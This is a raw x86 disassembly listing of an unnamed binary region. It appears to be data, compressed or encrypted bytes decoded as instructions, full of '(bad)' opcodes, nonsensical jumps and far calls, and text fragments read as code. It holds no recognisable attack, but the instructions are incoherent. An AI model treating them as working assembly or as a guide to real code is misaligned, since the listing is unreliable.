  423bb2:	cmp    al,0x75
  423bb4:	jne    0x423b6f
  423bb6:	inc    edi
  423bb7:	jne    0x423c2e
  423bb9:	jne    0x423bbb
	...
  423bc3:	outs   dx,BYTE PTR ds:[esi]
  423bc4:	cmp    ch,bl
  423bc6:	xchg   ebx,eax
  423bc7:	and    edx,DWORD PTR [edi-0x361f43d3]
  423bcd:	fild   WORD PTR [ecx-0x5d2ee4bd]
  423bd3:	xchg   DWORD PTR [ebx+0x40],esp
  423bd6:	fwait
  423bd7:	loope  0x423c08
  423bd9:	inc    edx
  423bda:	cdq    
  423bdb:	mov    DWORD PTR [ecx-0x76767677],ecx
  423be1:	mov    DWORD PTR [ecx-0x7e747477],ecx
  423be7:	aas    
  423be8:	es leave 
  423bea:	mov    ecx,DWORD PTR [ebx-0x4a25fc5b]
  423bf0:	sahf   
  423bf1:	scas   eax,DWORD PTR es:[edi]
  423bf2:	test   eax,0xa1f1396f
  423bf7:	sbb    ebp,DWORD PTR [esp+eiz*4+0x43]
  423bfb:	and    esi,DWORD PTR [edx-0x37]
  423bfe:	add    al,ch
  423c00:	or     BYTE PTR [eax],ch
  423c02:	retf   
  423c03:	mov    ds:0xa21fa132,eax
  423c08:	xor    ch,ch
  423c0a:	sub    ecx,DWORD PTR [ebx]
  423c0c:	jmp    0x423bfc
  423c0e:	in     eax,dx
  423c0f:	mov    ecx,DWORD PTR [ebx-0x7474e0d3]
  423c15:	jnp    0x423be5
  423c17:	call   0x3db23ba7
  423c1c:	sub    eax,0xa41aaa8a
  423c21:	pop    ebp
  423c22:	sbb    al,0x7
  423c24:	mov    BYTE PTR [eax+eiz*1],al
  423c27:	mov    ebx,0xd11d5417
  423c2c:	aas    
  423c2d:	not    eax
  423c2f:	pop    edi
  423c30:	arpl   WORD PTR [edi+edi*8-0x1],si
  423c34:	jmp    FWORD PTR [ebp-0x78]
  423c37:	sahf   
  423c38:	mov    WORD PTR [edi],cs
  423c3a:	js     0x423c08
  423c3c:	mov    ecx,0x47d4cd91
  423c41:	enter  0xd65b,0x3
  423c45:	fimul  WORD PTR [edi+ebx*8+0x24]
  423c49:	mov    edx,0xcde1d283
  423c4e:	xchg   BYTE PTR [ecx-0x40c0],ch
  423c54:	fld    TBYTE PTR [ecx]
  423c56:	mov    edi,0xffffff
	...
  423c63:	(bad)  [eax+0x70]
  423c66:	(bad)  
  423c67:	(bad)  
  423c68:	(bad)  
  423c69:	(bad)  
  423c6a:	(bad)  
  423c6b:	(bad)  
  423c6c:	(bad)  
  423c6d:	(bad)  
  423c6e:	inc    eax
  423c70:	ror    ah,0xd1
  423c73:	stos   BYTE PTR es:[edi],al
  423c74:	adc    al,0x8f
  423c76:	xchg   edx,eax
  423c77:	xlat   BYTE PTR ds:[ebx]
  423c78:	adc    ah,BYTE PTR [ebp-0x30]
  423c7b:	jae    0x423c04
  423c7d:	inc    edx
  423c7e:	rcl    BYTE PTR [edx],0xdf
  423c81:	xor    ch,BYTE PTR [edx-0x33014f97]
  423c87:	jmp    0xc020:0x37c0c034
  423c8e:	shl    ah,0x65
  423c91:	rol    al,0x96
  423c94:	cwde   
  423c95:	les    esp,FWORD PTR [eax+0x75]
  423c98:	ins    BYTE PTR es:[edi],dx
  423c99:	mov    ah,0x18
  423c9b:	in     al,0xf5
  423c9d:	inc    DWORD PTR [ebx-0x1c2fdc43]
  423ca3:	jne    0x423cf5
  423ca5:	xchg   BYTE PTR [ecx+ebp*4],dh
  423ca8:	or     al,BYTE PTR [ecx-0x40743fbc]
  423cae:	fidivr WORD PTR fs:[ebx+ecx*4-0x75]
  423cb3:	mov    esi,DWORD PTR [esi+0x500220ff]
  423cb9:	jo     0x423c84
  423cbb:	mov    al,ds:0xccc03ff0
  423cc0:	and    eax,0x65e26a4d
  423cc5:	imul   ebp,DWORD PTR [esi+0x23],0xd696173
  423ccc:	popaw  
  423cce:	push   ebx
  423ccf:	cs js  0x423cf2
  423cd2:	jae    0x423d48
  423cd4:	je     0x423cf6
  423cd6:	cmp    ch,BYTE PTR [ecx+0x65]
  423cd9:	ins    DWORD PTR es:[edi],dx
  423cda:	bound  esp,QWORD PTR [ecx+0x20]
  423cdd:	and    BYTE PTR [ecx+0x69],al
  423ce0:	gs jb  0x423d03
  423ce3:	inc    ebp
  423ce4:	and    bh,BYTE PTR [edi+edx*2]
  423ce7:	imul   edx,DWORD PTR [ebx+0x67],0x6f6b7420
  423cee:	and    BYTE PTR [esi+0x44],dh
  423cf1:	jb     0x423d55
  423cf3:	popa   
  423cf4:	and    BYTE PTR [esi],ch
  423cf6:	sub    DWORD PTR [ebp+0x20],ecx
  423cf9:	push   ebx
  423cfa:	ins    DWORD PTR es:[edi],dx
  423cfb:	arpl   WORD PTR ds:0x652e,bp
  423d00:	outs   dx,DWORD PTR gs:[esi]
  423d02:	inc    ebx
  423d03:	gs jo  0x423d73
  423d06:	popa   
  423d07:	imul   ebp,DWORD PTR [esi],0x206d3a6f
  423d0d:	gs jae 0x423d75
  423d10:	arpl   WORD PTR cs:[edx+0x20],si
  423d14:	gs cs jo 0x423d81
  423d18:	outs   dx,DWORD PTR cs:[esi]
  423d1a:	ins    DWORD PTR es:[edi],dx
  423d1b:	ins    DWORD PTR es:[edi],dx
  423d1c:	gs gs inc esp
  423d1f:	jbe    0x423d88
  423d21:	inc    esp
  423d22:	imul   esp,DWORD PTR [edx],0xd65633e
  423d28:	sub    BYTE PTR [edx+0x20],dh
  423d2b:	jno    0x423cea
  423d2d:	ret    
  423d2e:	mov    ecx,0x4c577a27
  423d33:	xlat   BYTE PTR ds:[ebx]
  423d34:	push   ecx
  423d35:	loop   0x423cc5
  423d37:	adc    al,0x3
  423d39:	les    ecx,FWORD PTR [edx]
  423d3b:	push   esi
  423d3c:	xchg   ebx,eax
  423d3d:	or     BYTE PTR [ebx-0x74e36175],cl
  423d43:	mov    ecx,DWORD PTR [ebx-0x72727273]
  423d49:	lea    ecx,[ebp-0x55727273]
  423d4f:	addr16 push ss
  423d51:	lea    ecx,[ebp-0x72727273]
  423d57:	lea    ecx,[ebp+0x148b8b8d]
  423d5d:	(bad)  
  423d5f:	gs push esp
  423d61:	add    al,0xf2
  423d63:	repz icebp 
  423d65:	cmp    al,dh
  423d67:	je     0x423d0a
  423d69:	push   edx
  423d6a:	paddusw mm5,QWORD PTR [eax+0x2d]
  423d6e:	mov    ebx,0x2a70d218
  423d73:	mov    cs,WORD PTR [ebx-0x71194575]
  423d79:	add    al,0x5e
  423d7b:	xchg   ecx,eax
  423d7c:	retf   0x94ed
  423d7f:	sar    BYTE PTR [esi],1
  423d81:	pop    ds
  423d82:	xchg   esi,eax
  423d83:	iret   
  423d84:	mov    DWORD PTR ds:0x7110024c,edx
  423d8a:	rcl    BYTE PTR [esi-0x28407630],1
  423d90:	mov    eax,0x8b8b84bd
  423d95:	adc    DWORD PTR [esi+0x45],ecx
  423d98:	mov    ecx,DWORD PTR [ebx-0x74838606]
  423d9e:	xor    edx,esi
  423da0:	std    
  423da1:	test   eax,edi
  423da3:	lods   eax,DWORD PTR ds:[esi]
  423da4:	popf   
  423da5:	and    al,0xf5
  423da7:	(bad)  [eax]
  423da9:	xor    ebp,DWORD PTR [ecx-0x9527e5d]
  423daf:	outs   dx,BYTE PTR ds:[esi]
  423db0:	mov    BYTE PTR [edi],dl
  423db2:	jnp    0x423d7b
  423db4:	test   ch,bl
  423db6:	inc    eax
  423db7:	xor    esi,DWORD PTR [ebx]
  423db9:	xor    edx,DWORD PTR [edi+0x293333ca]
  423dbf:	lods   al,BYTE PTR ds:[esi]
  423dc0:	xor    esi,DWORD PTR [ebx]
  423dc2:	xor    ecx,DWORD PTR [ebx-0x74747475]
  423dc8:	mov    ecx,DWORD PTR [ebx-0x3a357475]
  423dce:	hlt    
  423dcf:	xchg   ebp,eax
  423dd0:	ffreep st(0)
  423dd2:	lock add ecx,eax
  423dd5:	mov    ch,0x53
  423dd7:	fnstcw WORD PTR ds:0xe39f2b0c
  423ddd:	inc    eax
  423dde:	sbb    al,0xdd
  423de0:	xor    ebp,DWORD PTR [esi]
  423de2:	and    eax,0xe8e8e8bb
  423de7:	call   0xe92b26d4
  423dec:	call   0x1edc97c
  423df1:	adc    al,0x4c
  423df3:	mov    ecx,DWORD PTR [ebx+0x66c79a9b]
  423df9:	mov    eax,ds:0x2895f565
  423dfe:	adc    eax,0x8c93766
  423e03:	or     bl,BYTE PTR [ebp+0xd]
  423e06:	enter  0x7b54,0x65
  423e0a:	shl    ecx,1
  423e0c:	pop    ebp
  423e0d:	ja     0x423d9a
  423e0f:	sbb    dh,0x36
  423e12:	into   
  423e13:	jo     0x423e7c
  423e15:	inc    eax
  423e16:	lahf   
  423e17:	push   esi
  423e18:	mov    ecx,DWORD PTR [ebx-0x747400f0]
  423e1e:	fdivr  QWORD PTR [eax+0x7f0c8b27]
  423e24:	xor    edx,DWORD PTR [edi-0x670cbf76]
  423e2a:	mov    DWORD PTR [esi-0x16430fc1],edx
  423e30:	addr16 mov dl,cl
  423e33:	out    0xa8,al
  423e35:	call   0xcf7:0xcb7c685
  423e3c:	or     al,0xc
  423e3e:	push   ds
  423e3f:	out    0x95,al
  423e41:	cli    
  423e42:	or     bl,BYTE PTR [edx-0x2b]
  423e45:	push   0x16
  423e47:	cmp    cl,dl
  423e49:	adc    BYTE PTR ds:0x1035bb46,dl
  423e4f:	fld    DWORD PTR [ebx-0x6a431ed6]
  423e55:	scas   al,BYTE PTR es:[edi]
  423e56:	(bad)  
  423e57:	fcom   QWORD PTR [edx+esi*1-0x50f3f303]
  423e5e:	in     al,0xae
  423e60:	or     al,0xc
  423e62:	or     al,0x0
	...
  423e6c:	(bad)  
  423e6d:	adc    al,0xaa
	...
  423e77:	add    BYTE PTR [eax],al
  423e79:	add    dh,dl
  423e7b:	sub    ebx,DWORD PTR [esi+eax*4+0x1d167048]
  423e82:	dec    ecx
  423e83:	xor    BYTE PTR gs:[eax],dh
  423e86:	push   cs
  423e87:	mov    esp,0xc3ef33ba
  423e8c:	scas   eax,DWORD PTR es:[edi]
  423e8d:	xchg   esi,eax
  423e8e:	xchg   esp,eax
  423e8f:	add    edi,eax
  423e91:	xchg   ecx,eax
  423e92:	add    BYTE PTR [eax],al
  423e94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423e95:	or     eax,0x96190000
  423e9a:	add    BYTE PTR [eax],al
  423e9c:	fisttp QWORD PTR [edi+0x44]
  423e9f:	jp     0x423e4c
  423ea1:	and    al,0x27
  423ea3:	mov    ?,WORD PTR [eax-0x7061afc8]
  423ea9:	dec    ebx
  423eaa:	outs   dx,BYTE PTR ds:[esi]
  423eab:	out    dx,eax
  423eac:	pop    esp
  423ead:	rol    BYTE PTR [ecx],0xf3
  423eb0:	nop    ecx
  423eb3:	pop    DWORD PTR [eax]
  423eb5:	call   0x39414f39
  423eba:	call   0x17ad27a7
  423ebf:	cmp    esp,DWORD PTR [edx]
  423ec1:	retf   
  423ec2:	sti    
  423ec3:	jb     0x423e9d
  423ec5:	push   0xb93a0aba
  423eca:	or     al,0xf9
  423ecc:	push   ss
  423ecd:	inc    edx
  423ece:	je     0x423f0f
  423ed0:	sbb    DWORD PTR [esi-0x1ccaae6d],edi
  423ed6:	(bad)  
  423ed7:	fnsave [edi]
  423ed9:	mov    esp,0xc665f790
  423ede:	xchg   BYTE PTR [edi-0x283b1718],bl
  423ee4:	call   0x4327d1
  423ee9:	add    BYTE PTR [eax],al
  423eeb:	add    BYTE PTR [eax],al
  423eed:	add    BYTE PTR [eax],al
  423eef:	add    BYTE PTR [ebx-0x43],dl
  423ef2:	rol    BYTE PTR [eax],0x0
	...
  423efd:	add    BYTE PTR ds:0x1755f36d,bh
  423f03:	int3   
  423f04:	and    eax,0x9733c310
  423f09:	bound  ebp,QWORD PTR [eax+0x18bc9e46]
  423f0f:	dec    edx
  423f10:	jle    0x423eda
  423f12:	adc    al,0x2c
  423f14:	aaa    
  423f15:	xchg   ecx,eax
  423f16:	add    BYTE PTR [eax],al
  423f18:	sti    
  423f19:	test   al,0xbc
  423f1b:	daa    
  423f1c:	push   esp
  423f1d:	shr    DWORD PTR [ebx+0x74d610b],cl
  423f23:	mov    ecx,0xe77fc95
  423f28:	test   BYTE PTR [edi+0x46],dh
  423f2b:	(bad)  [edx+0x5]
  423f2e:	xchg   esi,eax
  423f2f:	jecxz  0x423eb4
  423f31:	es dec ebx
  423f33:	outs   dx,BYTE PTR ds:[esi]
  423f34:	in     eax,0x0
  423f36:	add    BYTE PTR [edi],bl
  423f38:	mov    eax,0x90000b6
  423f3d:	sbb    al,0xf2
  423f3f:	add    BYTE PTR [eax],al
  423f41:	idiv   BYTE PTR [esi-0x5301ceeb]
  423f47:	push   0xc556d95c
  423f4c:	popa   
  423f4d:	xchg   DWORD PTR [edi+0x50],edx
  423f50:	jg     0x423f1b
  423f52:	xor    edx,DWORD PTR [esi]
  423f54:	or     eax,0xa43909d3
  423f59:	add    BYTE PTR [eax],al
  423f5b:	add    BYTE PTR [edx+0xb000000],dh
  423f61:	imul   eax,DWORD PTR [eax],0xffff0000
  423f67:	(bad)  
  423f68:	(bad)  
  423f69:	(bad)  
  423f6a:	(bad)  
  423f6b:	(bad)  
  423f6c:	(bad)  
  423f6d:	jmp    FWORD PTR [ebp+0x4fdf069e]
  423f73:	mul    DWORD PTR [ebp+0x6f798dca]
  423f79:	ror    DWORD PTR [edx+0x56023c1e],cl
  423f7f:	mov    WORD PTR [ecx+0x14],?
  423f82:	imul   edx,ebp,0x404803c
  423f88:	add    al,0x4
  423f8a:	add    al,0x4
  423f8c:	add    al,0x4
  423f8e:	add    al,0xff
  423f90:	call   DWORD PTR [edi-0x102a3b]
  423f96:	(bad)  
  423f97:	cmp    DWORD PTR [ecx+0x7d],edi
  423f9a:	and    eax,DWORD PTR [edx+0x60]
  423f9d:	mov    dl,0xdd
  423f9f:	cmp    ecx,DWORD PTR [ecx-0x463235b4]
  423fa5:	push   ebp
  423fa6:	js     0x423ff4
  423fa8:	int    0x4b
  423faa:	mov    eax,0xa4446c3b
  423faf:	test   al,0x73
  423fb1:	push   ecx
  423fb2:	out    0xa7,al
  423fb4:	es jmp 0x45b108f6
  423fba:	(bad)  
  423fbb:	call   DWORD PTR [eax-0x60]
  423fbe:	(bad)  
  423fbf:	jmp    FWORD PTR [esi-0x37]
  423fc2:	in     al,dx
  423fc3:	inc    eax
  423fc5:	outs   dx,BYTE PTR ds:[esi]
  423fc6:	push   ebx
  423fc7:	inc    ebx
  423fc8:	mov    ss,WORD PTR [ecx]
  423fca:	mov    esp,0x7d424782
  423fcf:	jnp    0x424014
  423fd1:	ficomp WORD PTR [ebx]
  423fd3:	sub    al,BYTE PTR [ebp+0x2a]
  423fd6:	adc    eax,0x574bb38b
  423fdb:	cmp    eax,0xc0c0c035
  423fe0:	sbb    DWORD PTR [ebx],eax
  423fe2:	imul   edi,DWORD PTR [ecx+0x18],0xffffff99
  423fe6:	ret    
  423fe7:	test   al,0xe6
  423fe9:	xor    edi,DWORD PTR [ecx-0xcae6749]
  423fef:	xor    al,0x39
  423ff2:	cmp    DWORD PTR [eax],edx
  423ff4:	and    BYTE PTR [ebp+0x41],0xc1
  423ff8:	mov    esi,0xff5c6ad4
  423ffd:	rol    al,0x25
  424000:	mov    dl,0xb0
  424002:	rol    al,0xc0
  424005:	(bad)  
  424006:	(bad)  
  424007:	(bad)  
  424008:	(bad)  
  424009:	(bad)  
  42400a:	(bad)  
  42400b:	(bad)  
  42400c:	(bad)  
  42400d:	(bad)  
  42400e:	jg     0x424032
  424010:	scas   eax,DWORD PTR es:[edi]
  424011:	lea    ecx,[ebp-0x72727273]
  424017:	lea    ecx,[ebp-0x27ffff73]
  42401d:	lods   eax,DWORD PTR ds:[esi]
  42401e:	jnp    0x424080
  424020:	shl    DWORD PTR [ebx-0x1e],1
  424023:	or     ecx,DWORD PTR ds:[esi]
  424026:	div    BYTE PTR [eax+0x6f4d5715]
  42402c:	and    BYTE PTR [ebx+0x20],dl
  42402f:	bound  esi,QWORD PTR [edx+0x2f]
  424032:	gs push edi
  424034:	jb     0x42409b
  424036:	and    BYTE PTR [ebp+0x73],dh
  424039:	outs   dx,BYTE PTR ds:[esi]
  42403a:	bound  ebp,QWORD PTR fs:[ecx+0x6d]
  42403e:	jo     0x4240ae
  424040:	and    BYTE PTR [ecx+0x78],ch
  424043:	jae    0x4240aa
  424045:	push   eax
  424046:	jne    0x4240b5
  424048:	je     0x424054
  42404a:	jae    0x4240be
  42404c:	arpl   WORD PTR [ebp+0x72],sp
  42404f:	cs je  0x424072
  424052:	ins    DWORD PTR es:[edi],dx
  424053:	and    BYTE PTR cs:[ebp+0x54],ah
  424057:	arpl   WORD PTR [esi+0x3e],bp
  42405a:	jae    0x42407c
  42405c:	outs   dx,DWORD PTR ds:[esi]
  42405d:	popa   
  42405e:	push   ebx
  42405f:	or     ch,BYTE PTR [ebp+0x43]
  424062:	inc    ecx
  424063:	jo     0x4240d7
  424065:	gs ins DWORD PTR es:[edi],dx
  424067:	push   ebx
  424068:	ins    BYTE PTR es:[di],dx
  42406a:	or     ah,BYTE PTR [edx]
  42406c:	bound  esi,QWORD PTR [ebp+eiz*2+0x62]
  424070:	cs gs jo 0x4240ed
  424074:	ins    DWORD PTR es:[edi],dx
  424075:	push   edx
  424076:	jbe    0x4240db
  424078:	imul   esp,DWORD PTR [edi+0x63],0x6574630a
  42407f:	jb     0x4240eb
  424081:	ret    0x61bb
  424084:	sahf   
  424085:	lea    esp,ds:0xf07d31
  42408b:	add    BYTE PTR [esi+edx*1+0x454c0000],ch
  424092:	add    BYTE PTR [eax],al
  424094:	stos   BYTE PTR es:[edi],al
  424095:	hlt    
  424096:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424097:	gs in  al,0xe9
  42409a:	cmp    al,0x84
  42409c:	xchg   ch,dh
  42409e:	mov    ds:0x6ebdd02,al
  4240a3:	icebp  
  4240a4:	loopne 0x42411d
  4240a6:	add    DWORD PTR [ecx],ecx
  4240a8:	push   ss
  4240a9:	daa    
  4240aa:	in     eax,0x32
  4240ac:	add    BYTE PTR [eax],al
  4240ae:	inc    edi
  4240af:	jle    0x4240e8
  4240b1:	pop    es
  4240b2:	add    BYTE PTR [eax],al
  4240b4:	add    BYTE PTR [edi+0x110ce437],dl
  4240ba:	push   0x9a8240dd
  4240bf:	inc    esi
  4240c0:	fistp  DWORD PTR [edx]
  4240c2:	bound  edx,QWORD PTR [esi-0x59]
  4240c5:	add    DWORD PTR ds:0x301f6a8,ebx
  4240cb:	ins    DWORD PTR es:[edi],dx
  4240cc:	dec    esp
  4240cd:	mov    ecx,0x210c687c
  4240d2:	dec    esi
  4240d3:	mov    dh,BYTE PTR [eax+0x67f9c9]
  4240d9:	add    BYTE PTR [esi-0x5],ah
	...
  4240e8:	addr16 push esp
  4240ea:	lahf   
  4240eb:	test   DWORD PTR [ebp-0x7a7a7a7b],eax
  4240f1:	test   DWORD PTR [ebp-0x14ffff7b],eax
  4240f7:	sub    dl,al
  4240f9:	outs   dx,DWORD PTR ds:[esi]
  4240fa:	fsubp  st(1),st
  4240fc:	xor    BYTE PTR ds:0xc4dd1979,dh
  424102:	hlt    
  424103:	outs   dx,DWORD PTR ds:[esi]
  424104:	shl    esp,1
  424106:	repnz vmaxsd xmm2,xmm1,xmm2
  42410b:	mov    bh,0x25
  42410d:	sub    eax,0xe0440000
  424112:	xor    ecx,DWORD PTR [esi+0x6d8b897c]
  424118:	jp     0x4240c0
  42411a:	add    eax,0x750ef40a
  42411f:	sahf   
  424120:	outs   dx,BYTE PTR ds:[esi]
  424121:	xor    DWORD PTR [eax+0x487721a6],0x7ea22965
  42412b:	adc    al,0x57
  42412d:	add    BYTE PTR [eax],al
  42412f:	aaa    
  424130:	mov    bh,0x7d
  424132:	add    BYTE PTR [eax],al
  424134:	cs xchg ecx,eax
  424136:	jge    0x424138
  424138:	mov    DWORD PTR [edi+edx*4],ebx
  42413b:	test   BYTE PTR [eax+0x41],0xd0
  42413f:	ss int3 
  424141:	inc    ecx
  424142:	sbb    BYTE PTR [eax+0x3e],al
  424145:	pop    esp
  424146:	sbb    bh,BYTE PTR [edx]
  424148:	dec    eax
  424149:	push   cs
  42414a:	xor    DWORD PTR [esi-0x76],ecx
  42414d:	pusha  
  42414e:	out    dx,eax
  42414f:	(bad)  
  424150:	sti    
  424151:	mov    DWORD PTR [ecx-0x76850e77],ecx
  424157:	mov    DWORD PTR [eax-0x76767687],edx
	...
  424165:	add    BYTE PTR [edx],cl
  424167:	mov    ds:0x31b6a5ac,al
  42416c:	clc    
  42416d:	test   eax,0x761d2078
  424172:	jge    0x4241b5
  424174:	lahf   
  424175:	jp     0x4240f9
  424177:	mov    ebx,0xe301f173
  42417c:	(bad)  
  42417d:	mov    ebp,0x0
  424182:	add    BYTE PTR [eax],al
  424184:	add    BYTE PTR [eax],al
  424186:	add    BYTE PTR [ebx+0x6300b88b],cl
  42418c:	ins    BYTE PTR es:[edi],dx
  42418d:	mov    ecx,DWORD PTR [ebx+0x16622dd6]
  424193:	in     eax,dx
  424194:	outs   dx,DWORD PTR ds:[esi]
  424195:	ins    BYTE PTR es:[edi],dx
  424196:	clc    
  424197:	lods   eax,DWORD PTR ds:[esi]
  424198:	inc    ebx
  424199:	iret   
  42419a:	and    ebx,edi
  42419c:	lods   eax,DWORD PTR ds:[esi]
  42419d:	mov    bl,0x36
  42419f:	jmp    0x740:0x3fd85c6b
  4241a6:	mov    ch,0x87
  4241a8:	xor    eax,0x6ab5971
  4241ad:	shl    DWORD PTR [edx-0x57],cl
  4241b0:	mov    esi,0xef8b8b15
  4241b5:	mov    ecx,DWORD PTR ss:[ebx-0x74130daf]
  4241bc:	add    BYTE PTR [esi],ah
  4241be:	gs in  al,dx
  4241c0:	sbb    dh,ch
  4241c2:	pop    ecx
  4241c3:	jecxz  0x4241cc
  4241c5:	mov    cl,BYTE PTR [eax+esi*1]
  4241c8:	jmp    0x346e748c
  4241cd:	dec    ebp
  4241ce:	cmp    edx,DWORD PTR [edi+esi*8]
  4241d1:	in     eax,0xce
  4241d3:	lock test BYTE PTR [eax],al
  4241d6:	add    BYTE PTR [eax],al
  4241d8:	cwde   
  4241d9:	dec    edx
  4241da:	out    dx,eax
  4241db:	cwde   
  4241dc:	mov    bh,BYTE PTR [ebx+0x71]
  4241df:	cmc    
  4241e0:	or     eax,0x332f3392
  4241e5:	in     al,dx
  4241e6:	call   0xc43f:0xeea49854
  4241ed:	inc    eax
  4241ee:	in     al,dx
  4241ef:	call   0x9b:0x74f4d1dc
  4241f6:	add    BYTE PTR [edx],dl
  4241f8:	mov    esp,0xd5
  4241fd:	lea    ecx,[ebp-0x72727273]
  424203:	lea    ecx,[ebp+0x3e63378d]
	...
  424211:	add    BYTE PTR [eax],cl
  424213:	or     BYTE PTR [edi],al
  424215:	and    dl,dl
  424217:	adc    BYTE PTR [eax+esi*1+0x5e],0x11
  42421c:	js     0x424246
  42421e:	(bad)  
  42421f:	ror    BYTE PTR [edi+0x6e],0xf1
  424223:	pop    edx
  424224:	inc    edi
  424225:	enter  0xbdf9,0x68
  424229:	jg     0x424213
  42422b:	xor    BYTE PTR [eax],cl
  42422d:	or     BYTE PTR [edi+0x13080855],bh
  424233:	pop    esp
  424234:	or     BYTE PTR [eax],cl
  424236:	aad    0x2b
  424238:	pushf  
  424239:	icebp  
  42423a:	pop    esi
  42423b:	or     al,0x8c
  42423d:	xchg   esp,eax
  42423e:	pop    edi
  42423f:	adc    al,0xd3
  424241:	in     al,0xde
  424243:	jmp    0x424287
  424245:	jle    0x4241f7
  424247:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424248:	outs   dx,DWORD PTR ds:[esi]
  424249:	aam    0xc1
  42424b:	imul   eax,ebp,0xcfcc0896
  424251:	dec    eax
  424252:	add    ah,BYTE PTR [eax-0x76333334]
  424258:	fidivr WORD PTR [ecx-0x1bb5fa96]
  42425e:	nop
  42425f:	sub    bh,BYTE PTR [esi]
  424261:	xor    DWORD PTR [eax],eax
  424263:	out    0x6a,al
  424265:	lea    eax,[edx+esi*8-0x7fdd8031]
  42426c:	xchg   DWORD PTR [ebp+0x283b8272],edi
  424272:	and    BYTE PTR gs:[ecx+0x772d5015],ah
  424279:	fwait
  42427a:	int3   
  42427b:	int3   
  42427c:	mov    ds:0xcccccc64,eax
  424281:	(bad)  
  424282:	(bad)  
  424283:	(bad)  
  424284:	(bad)  
  424285:	(bad)  
  424286:	(bad)  
  424287:	(bad)  
  424288:	(bad)  
  424289:	(bad)  
  42428a:	aas    
  42428b:	fwait
  42428c:	jae    0x83c5c615
  424292:	add    DWORD PTR [ebx-0x74747c7d],0xffffff8c
  424299:	fnstenv [esi+0x6872ba6]
  42429f:	mov    ch,0xd1
  4242a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4242a2:	outs   dx,BYTE PTR ds:[esi]
  4242a3:	out    0x6d,al
  4242a5:	icebp  
  4242a6:	jmp    0x3595ada
  4242ab:	mov    edx,0x92f7bb94
  4242b0:	mov    ecx,DWORD PTR [ebx+0x641cd17a]
  4242b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242b7:	inc    ecx
  4242b8:	jle    0x42428f
  4242ba:	jmp    0x4242b5
  4242bc:	push   0xffffffa0
  4242be:	mov    eax,0xefc9e1a3
  4242c3:	push   ebx
  4242c4:	out    0xd7,al
  4242c6:	aas    
  4242c7:	ficom  WORD PTR [esi+ecx*4-0x2aa9b743]
  4242ce:	inc    eax
  4242cf:	mov    ecx,DWORD PTR [ebx-0x74bf3c5b]
  4242d5:	mov    esi,DWORD PTR [esi-0x6]
  4242d8:	sbb    ecx,DWORD PTR [ebx-0x5c7b7600]
  4242de:	pop    esi
  4242e0:	mov    esi,0xd0a4b1ab
  4242e5:	cmp    ah,0xff
  4242e8:	lea    esi,[ebp-0xf]
  4242eb:	lock push eax
  4242ed:	jle    0x424351
  4242ef:	test   eax,0x8fa723
  4242f4:	add    BYTE PTR [eax],al
  4242f6:	and    BYTE PTR [edi+0x0],0x0
  4242fa:	add    al,0xeb
  4242fc:	add    BYTE PTR [eax],al
  4242fe:	add    BYTE PTR [edi+0x72],dh
  424301:	jns    0x424368
  424303:	ins    DWORD PTR es:[edi],dx
  424304:	ins    DWORD PTR es:[edi],dx
  424305:	jb     0x424327
  424307:	jb     0x42435c
  424309:	cs cmp al,0x4d
  42430c:	and    BYTE PTR [ebx+esi*2+0x72],al
  424310:	gs das 
  424312:	and    BYTE PTR ds:0x206f632f,cl
  424318:	je     0x42437c
  42431a:	jbe    0x424381
  42431c:	and    BYTE PTR [esi],ch
  42431e:	gs jb  0x42438d
  424321:	bound  ebp,QWORD PTR [ebp+eiz*2+0x3e]
  424325:	gs ins DWORD PTR es:[edi],dx
  424327:	bound  ebp,QWORD PTR [ebp+eiz*2+0x62]
  42432b:	cmp    al,0x72
  42432d:	gs gs jae 0x42436f
  424331:	das    
  424332:	and    BYTE PTR [ebp+0x73],dh
  424335:	popa   
  424336:	inc    ecx
  424337:	ins    DWORD PTR es:[edi],dx
  424338:	gs jae 0x4243ab
  42433b:	jo     0x424360
  42433d:	and    BYTE PTR [edi+0x6c],ch
  424340:	sub    DWORD PTR [eax+0x70],edi
  424343:	arpl   WORD PTR [edi+0x73],bp
  424346:	arpl   WORD PTR [ebx-0x74747475],cx
  42434c:	mov    ecx,DWORD PTR [ebx-0x72687475]
  424352:	pop    ecx
  424353:	fadd   DWORD PTR [esp+ebp*8-0x43]
  424357:	cmp    al,0x6c
  424359:	sbb    al,0x43
  42435b:	cmp    edx,DWORD PTR [ebx]
  42435d:	jmp    0x4e99013
  424362:	es push es
  424364:	inc    edx
  424365:	and    DWORD PTR gs:[ecx+0x0],ecx
	...
  424371:	test   DWORD PTR [ebp-0x2df5c44],eax
  424377:	test   DWORD PTR [ebp+0x6b868a84],eax
  42437d:	or     edx,edx
  42437f:	add    BYTE PTR [esi+ebp*2-0x25f0af80],ah
  424386:	leave  
  424387:	fimul  WORD PTR [edx+0x77]
  42438a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42438b:	imul   esp,ebp,0x58
  42438e:	xor    esi,esi
  424390:	xlat   BYTE PTR fs:[ebx]
  424392:	xchg   DWORD PTR [esi+0x71b48482],esp
  424398:	jmp    0x4243d5
  42439a:	jge    0x424413
  42439c:	test   DWORD PTR [ebp-0x7a7af534],eax
  4243a2:	addr16 xchg ebx,eax
  4243a4:	pop    esi
  4243a5:	test   DWORD PTR [ebx+0x7a90e4f],eax
  4243ab:	xlat   BYTE PTR ds:[ebx]
  4243ac:	push   ebp
  4243ad:	mov    al,0xa2
  4243af:	cs icebp 
  4243b1:	pavgb  mm3,QWORD PTR [esi-0x30359028]
  4243b8:	pop    ss
  4243b9:	push   0xd3c7b265
  4243be:	lahf   
  4243bf:	add    DWORD PTR [ebx+0x57a8d683],0xffffffd4
  4243c6:	shl    BYTE PTR [ecx+0x4c827946],0xd5
  4243cd:	mov    dl,0x19
  4243cf:	ins    BYTE PTR es:[edi],dx
  4243d0:	call   0xb8714fbc
  4243d5:	fbld   TBYTE PTR [edx-0x77]
  4243d8:	sti    
  4243d9:	add    ax,0xeb01
  4243dd:	sub    eax,0x7b83832f
  4243e2:	and    DWORD PTR [edx+0x50838383],esp
  4243e8:	push   eax
  4243e9:	push   eax
  4243ea:	push   eax
  4243eb:	push   eax
  4243ec:	push   eax
  4243ed:	push   eax
  4243ee:	push   eax
  4243ef:	push   eax
  4243f0:	mov    ebp,0x3257
  4243f5:	add    BYTE PTR [eax],al
  4243f7:	add    BYTE PTR [eax],al
